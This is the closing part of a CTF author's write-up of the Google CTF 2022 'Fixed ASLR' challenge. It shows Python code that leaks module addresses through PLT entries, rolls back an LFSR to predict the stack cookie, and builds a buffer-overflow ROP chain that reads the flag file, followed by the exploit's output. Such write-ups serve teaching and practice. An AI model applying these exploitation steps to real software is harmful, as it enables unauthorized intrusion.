+│⠀⠀⠀⠀⠀⠀⠀ Or, in form of Python exploit code:                                 │
+│⠀⣾⣿⣿⣿⡀⠀                                                                     │
+│⠀⣿⠀⠀⠀⣿⠀  def mem_at_addr(addr):                                             │
+│⠀⣿⣿⣿⣿⡁⠀     offset = addr - (MAIN_ADDR + 0x2000)                            │
+│⠀⣿⠀⠀⠀⣿⠀     return mem_at_offset(offset)                                    │
+│⠀⡿⠀⠀⠀⢿⠀                                                                     │
+│⠀⠀⠀⠀⠀⠀⠀ Let's look back at that PLT section. Since main.o is using          │
+│⠀⠀⠀⠠⡀⠀⠀ functions like menu() (game.o) and __stack_chk_fail() (guard.o), we │
+│⠀⠀⠀⠀⢣⠀⠀ immediately get two more addresses from there.                      │
+│⠀⠀⠀⠀⠈⣶⠀                                                                     │
+│⠀⠀⠀⠀⠀⣿⠀   GAME_ADDR = mem_at_addr(MAIN_ADDR + 0x08) & MASK                  │
+│⠀⠀⠀⠀⠀⣿⡀   GUARD_ADDR = mem_at_addr(MAIN_ADDR + 0x38) & MASK                 │
+│⠀⠀⠀⠀⢀⣿⠇                                                                     │
+│⠀⠀⠀⠀⣸⡿⠀ The __stack_chk_fail() uses the sys_write() and sys_exit() syscall  │
+│⠀⠀⠀⢰⣿⠁⠀ wrapper functions from syscalls.o. As such, we get the address of   │
+│⠀⠀⢠⣿⠃⠀⠀ that module as well from guard.o's PLT:                             │
+│⠀⠀⣾⡏⠀⠀⠀                                                                     │
+│⠀⢸⣿⠀⠀⠀⠀   SYSCALLS_ADDR = mem_at_addr(GUARD_ADDR + 0x08) & MASK             │
+│⠀⢸⡏⠀⠀⠀⠀                                                                     │
+│⠀⢸⡇⠀⠀⠀⠀ The game.o functions use both basic.o functions and the ASCII-art   │
+│⠀⠸⡇⠀⠀⠀⠀ banner from res.o. That's two more addresses from the game.o's PLT  │
+│⠀⠀⢣⠀⠀⠀⠀ section for us:                                                     │
+│⠀⠀⠈⢆⠀⠀⠀                                                                     │
+│⠀⠀⠀⠘⡄⠀⠀   BASIC_ADDR = mem_at_addr(GAME_ADDR + 0x08) & MASK                 │
+│⠀⠀⠀⠀⢱⠀⠀   RES_ADDR = mem_at_addr(GAME_ADDR + 0x2000) & MASK                 │
+│⠀⠀⠀⠀⠀⣿⠀                                                                     │
+│⠀⠀⠀⠀⠀⣿⠀ And... that's actually it. At this point we have the 6 required     │
+│⠀⠀⠀⠀⠀⣿⡄ addresses, which give us 72 bits of state – even more than needed:  │
+│⠀⠀⠀⠀⢠⣿⠃                                                                     │
+│⠀⠀⠀⠀⣼⡟⠀   lfsr_state = 0                                                    │
+│⠀⠀⠀⣸⡿⠀⠀   lfsr_state |= ((RES_ADDR &gt;&gt; 28) & 0xfff) &lt;&lt; 0                     │
+│⠀⠀⢰⣿⠁⠀⠀   lfsr_state |= ((GAME_ADDR &gt;&gt; 28) & 0xfff) &lt;&lt; 12                   │
+│⠀⢀⣿⠇⠀⠀⠀   lfsr_state |= ((BASIC_ADDR &gt;&gt; 28) & 0xfff) &lt;&lt; 24                  │
+│⠀⢸⣿⠀⠀⠀⠀   lfsr_state |= ((GUARD_ADDR &gt;&gt; 28) & 0xfff) &lt;&lt; 36                  │
+│⠀⢸⡇⠀⠀⠀⠀   lfsr_state |= ((SYSCALLS_ADDR &gt;&gt; 28) & 0xfff) &lt;&lt; 48               │
+│⠀⢸⡇⠀⠀⠀⠀   lfsr_state |= ((MAIN_ADDR &gt;&gt; 28) & 0xfff) &lt;&lt; 60                   │
+│⠀⠘⡇⠀⠀⠀⠀   lfsr_state &= 0xffffffffffffffff                                  │
+│⠀⠀⢱⠀⠀⠀⠀                                                                     │
+│⠀⠀⠀⢣⠀⠀⠀ What we can do now is roll forward the LFSR PRNG to get the 12 next │
+│⠀⠀⠀⠈⢆⠀⠀ bits, which will disclose debug.o's address in memory:              │
+│⠀⠀⠀⠀⠸⣄⠀                                                                     │
+│⠀⠀⠀⠀⠀⣿⠀   DEBUG_ADDR = LFSR(state, 12) &lt;&lt; 28                                │
+│⠀⠀⠀⠀⠀⣿⠀                                                                     │
+│⠀⠀⠀⠀⠀⣿⡆ And, we can also roll it back 72 bits, which will give us the stack │
+│⠀⠀⠀⠀⢰⣿⠁ cookie:                                                             │
+│⠀⠀⠀⢀⣿⠇⠀                                                                     │
+│⠀⠀⠀⣼⡟⠀⠀   def rollback(rand_state):                                         │
+│⠀⠀⣸⡿⠀⠀⠀     BIAS = 64 - 16                                                  │
+│⠀⢠⣿⠃⠀⠀⠀     new_bit = get_bit(rand_state[0], 0)                             │
+│⠀⢸⡟⠀⠀⠀⠀     bit_64 = (                                                      │
+│⠀⢸⡇⠀⠀⠀⠀         1 ^                                                         │
+│⠀⢸⡇⠀⠀⠀⠀         new_bit ^                                                   │
+│⠀⠈⡇⠀⠀⠀⠀         get_bit(rand_state[0], BIAS + 14) ^                         │
+│⠀⠀⠘⡄⠀⠀⠀         get_bit(rand_state[0], BIAS + 13) ^                         │
+│⠀⠀⠀⢱⠀⠀⠀         get_bit(rand_state[0], BIAS + 11)                           │
+│⠀⠀⠀⠀⢣⠀⠀     )                                                               │
+│⠀⠀⠀⠀⠈⣶⠀     rand_state[0] = (                                               │
+│⠀⠀⠀⠀⠀⣿⠀         ((rand_state[0] &gt;&gt; 1) & 0xffffffffffffffff) |               │
+│⠀⠀⠀⠀⠀⣿⠀         (bit_64 &lt;&lt; 63)                                              │
+│⠀⠀⠀⠀⠀⣿⡇     )                                                               │
+│⠀⠀⠀⠀⣸⡿⠀                                                                     │
+│⠀⠀⠀⢠⣿⠃⠀   lfsr_copy = [lfsr_state]                                          │
+│⠀⠀⢀⣿⠇⠀⠀   for _ in range(72):                                               │
+│⠀⠀⣼⡟⠀⠀⠀     rollback(lfsr_copy)                                             │
+│⠀⢰⣿⠁⠀⠀⠀                                                                     │
+│⠀⠘⠋⠀⠀⠀⠀   cookie = lfsr_copy[0]                                             │
+╰────────────────────────────────────────────────────────────────────────────╯
+
+╭────────────────────────────────────────────────────────────────────────────╮
+│ Originally I hoped that the Player would have to look around        ⠀⠀⠀⠀⠀⠀⠀│
+│ objects' memory a bit longer. Unfortunately (or perhaps fortunately ⠀⢀⣿⣿⣿⣷⠀│
+│ for the Player) the PLT sections in various modules delivered       ⠀⣿⠀⠀⠀⠀⠀│
+│ everything on a silver platter. The only complication there was     ⠀⣿⠀⠀⠀⠀⠀│
+│ figuring out what is what in that PLT section, as Ghidra or IDA     ⠀⣿⠀⠀⠀⠀⠀│
+│ would be of little help there. Still, with GDB and comparing        ⠀⠈⣿⣿⣿⡿⠀│
+│ offsets and content of functions it was still pretty fast to figure ⠀⠀⠀⠀⠀⠀⠀│
+│ out which module one is looking at.                                 ⠀⠀⠀⠀⠀⠀⠀│
+╰────────────────────────────────────────────────────────────────────────────╯
+
+╭────────────────────────────────────────────────────────────────────────────╮
+│⠀⠀⠀⠀⠀⠀⠀ The last step is the actual exploitation. It's perhaps not the      │
+│⠀⣾⣿⣿⣿⡀⠀ easiest one, but it's pretty straight forward as far as stack-based │
+│⠀⣿⠀⠀⠀⣿⠀ buffer overflows with ROP chains go.                                │
+│⠀⣿⣿⣿⣿⠁⠀                                                                     │
+│⠀⣿⠀⠀⠀⠀⠀ | player name | ignored | cookie  | old frame | ret addr | ...      │
+│⠀⢿⠀⠀⠀⠀⠀ |   32 bytes  | 8 bytes | 8 bytes |  8 bytes  | 8 bytes  |          │
+│⠀⠀⠀⠀⠀⠀⠀                                                                     │
+│⠀⣷⠀⠀⠀⠀⠀ The actual overflowed buffer in get_player_name can be filled with  │
+│⠀⣿⠀⠀⠀⠀⠀ whatever, but since we know where its content is going to be copied │
+│⠀⣿⠀⠀⠀⠀⠀ to (scoreboard's names array), we can actually use this to put a    │
+│⠀⣿⠀⠀⠀⠀⠀ controlled string there.                                            │
+│⠀⢿⣿⣿⣿⣷⠀                                                                     │
+│⠀⠀⠀⠀⠀⠀⠀ We do have to make a decision here whether to go for a full shell   │
+│⠀⢀⣿⣿⣿⡀⠀ or just read and leak the flag file (after all, its name is known,  │
+│⠀⣿⠀⠀⠀⣿⠀ it's just "flag" in the current working directory of the process).  │
+│⠀⣿⡷⠶⢾⣿⠀ I decided to do the latter as it sounded a bit simpler.             │
+│⠀⣿⠀⠀⠀⣿⠀                                                                     │
+│⠀⡿⠀⠀⠀⢿⠀ As such, the controlled string that would end up at                 │
+│⠀⠀⠀⠀⠀⠀⠀ main.o+0x2060+0x20*place was just "flag".                           │
+│⠀⣷⠀⠀⠀⣾⠀                                                                     │
+│⠀⣿⠀⠀⠀⣿⠀ After that, the buffer could be overflown, with the stack cookie    │
+│⠀⠈⣿⣿⣿⠁⠀ following it immediately afterwards. After that we get to put a     │
+│⠀⠀⠀⣿⠀⠀⠀ 64-bit value on the stack which ends up in RBP, but I don't think   │
+│⠀⠀⠀⡿⠀⠀⠀ we need anything special in that register so just zero filling it   │
+│⠀⠀⠀⠀⠀⠀⠀ will work.                                                          │
+│⠀⣾⣿⣿⣿⣷⠀                                                                     │
+│⠀⣿⠀⠀⠀⠀⠀ Next comes the return address, and therefore the ROP chain.         │
+│⠀⣿⣿⣿⡷⠀⠀                                                                     │
+│⠀⣿⠀⠀⠀⠀⠀ Having a lot of useful gadgets both in debug.o and syscalls.o this  │
+│⠀⢿⣿⣿⣿⡿⠀ was more of a formality than anything else. Eventually the ROP      │
+│⠀⠀⠀⠀⠀⠀⠀ chain formed was an equivalent of:                                  │
+│⠀⣾⣿⣿⣿⡀⠀                                                                     │
+│⠀⣿⠀⠀⠀⣿⠀   sys_open("flag")  # main.o+0x2060+0x20*place                      │
+│⠀⣿⣿⣿⣿⡁⠀   sys_read(3, some_free_addr_in_main, 64)                           │
+│⠀⣿⠀⠀⠀⣿⠀   sys_write(1, some_free_addr_in_main, 64)                          │
+│⠀⡿⠀⠀⠀⢿⠀   sys_exit(0)                                                       │
+│⠀⠀⠀⠀⠀⠀⠀                                                                     │
+│⠀⠀⠀⠠⡀⠀⠀ One thing to note here, is that the file descriptor returned by     │
+│⠀⠀⠀⠀⢣⠀⠀ sys_open was just guessed to be 3. This was an easy guess of        │
+│⠀⠀⠀⠀⠈⣶⠀ course, as file descriptor numbers are assigned consecutively, so   │
+│⠀⠀⠀⠀⠀⣿⠀ if the standard stdin/out/err were 0-2, the next one would be 3.    │
+│⠀⠀⠀⠀⠀⣿⡀ And if this wouldn't work remotely, then 4, 5, 6, and so on could   │
+│⠀⠀⠀⠀⢀⣿⠇ be tried.                                                           │
+│⠀⠀⠀⠀⣸⡿⠀                                                                     │
+│⠀⠀⠀⢰⣿⠁⠀ After putting this all together (see healthcheck.py file for an     │
+│⠀⠀⢠⣿⠃⠀⠀ example exploit), I finally got the flag:                           │
+│⠀⠀⣾⡏⠀⠀⠀                                                                     │
+│⠀⢸⣿⠀⠀⠀⠀   $ ./exploit.py                                                    │
+│⠀⢸⡏⠀⠀⠀⠀   b'== proof-of-work: '                                             │
+│⠀⢸⡇⠀⠀⠀⠀   main.o is at: 0x64d0000000                                        │
+│⠀⠸⡇⠀⠀⠀⠀   game.o is at: 0x6b80000000                                        │
+│⠀⠀⢣⠀⠀⠀⠀   guard.o is at: 0x43c0000000                                       │
+│⠀⠀⠈⢆⠀⠀⠀   syscalls.o is at: 0x3e50000000                                    │
+│⠀⠀⠀⠘⡄⠀⠀   basic.o is at: 0x5050000000                                       │
+│⠀⠀⠀⠀⢱⠀⠀   res.o is at: 0x6b40000000                                         │
+│⠀⠀⠀⠀⠀⣿⠀   debug.o should be at: 0x8000000000                                │
+│⠀⠀⠀⠀⠀⣿⠀   confirmed! debug.o is where it was expected to be                 │
+│⠀⠀⠀⠀⠀⣿⡄   rolling back LFSR...                                              │
+│⠀⠀⠀⠀⢠⣿⠃   predicted cookie: 0xb81d7ae7d135a403                              │
+│⠀⠀⠀⠀⣼⡟⠀   winning the game...                                               │
+│⠀⠀⠀⣸⡿⠀⠀   4 + 9 --&gt; 13                                                      │
+│⠀⠀⢰⣿⠁⠀⠀   8 + 6 --&gt; 14                                                      │
+│⠀⢀⣿⠇⠀⠀⠀   5 + 8 --&gt; 13                                                      │
+│⠀⢸⣿⠀⠀⠀⠀   5 + 9 --&gt; 14                                                      │
+│⠀⢸⡇⠀⠀⠀⠀   7 + 1 --&gt; 8                                                       │
+│⠀⢸⡇⠀⠀⠀⠀   6 + 9 --&gt; 15                                                      │
+│⠀⠘⡇⠀⠀⠀⠀   3 + 7 --&gt; 10                                                      │
+│⠀⠀⢱⠀⠀⠀⠀   4 + 3 --&gt; 7                                                       │
+│⠀⠀⠀⢣⠀⠀⠀   0 + 3 --&gt; 3                                                       │
+│⠀⠀⠀⠈⢆⠀⠀   6 + 6 --&gt; 12                                                      │
+│⠀⠀⠀⠀⠸⣄⠀   3 + 2 --&gt; 5                                                       │
+│⠀⠀⠀⠀⠀⣿⠀   game won, exploiting buffer overflow...                           │
+│⠀⠀⠀⠀⠀⠛⠀   flag: b'CTF{GuessYouCanSayTheCookieGotRandomlyBroken}'            │
+╰────────────────────────────────────────────────────────────────────────────╯
+
+╭────────────────────────────────────────────────────────────────────────────╮
+│ The ROP part was supposed to be easy for this task, as I expected   ⠀⠀⠀⠀⠀⠀⠀│
+│ the Player to be pretty tired after dealing with all that reverse   ⠀⢀⣿⣿⣿⣷⠀│
+│ engineering and cryptography. That's also the reason why the task   ⠀⣿⠀⠀⠀⠀⠀│
+│ description contained the location and name of the flag file.       ⠀⣿⠀⠀⠀⠀⠀│
+│                                                                     ⠀⣿⠀⠀⠀⠀⠀│
+│ Or, to put it another way, the ROP chain was supposed to just be a  ⠀⠈⣿⣿⣿⡿⠀│
+│ victory lap before getting the flag.                                ⠀⠀⠀⠀⠀⠀⠀│
+╰────────────────────────────────────────────────────────────────────────────╯
+
+
+                          ▁▂▃▄▅▆▇█ Summary █▇▆▅▄▃▂▁
+
+Eventually the task was solved by quite a lot of teams, as expected on a top
+level CTF. A few write-ups also were published. If you'd like to read them,
+you can find them at:
+
+https://kileak.github.io/ctf/2022/googlectf22-fixedaslr/
+https://chovid99.github.io/posts/google-ctf-2022/#fixed-aslr
+https://ctftime.org/writeup/34483
+
+It was pretty fun to make and it received pretty positive feedback – at least
+from players that managed to solve it ;)
+
+And that's it! ELFs are fun, aren't they?
+--
+gynvael
+
+--[ <a href="7.html">PREV</a> | <a href="index.html">HOME</a> | <a href="9.html">NEXT</a> ]--
+
+</pre></div></body>
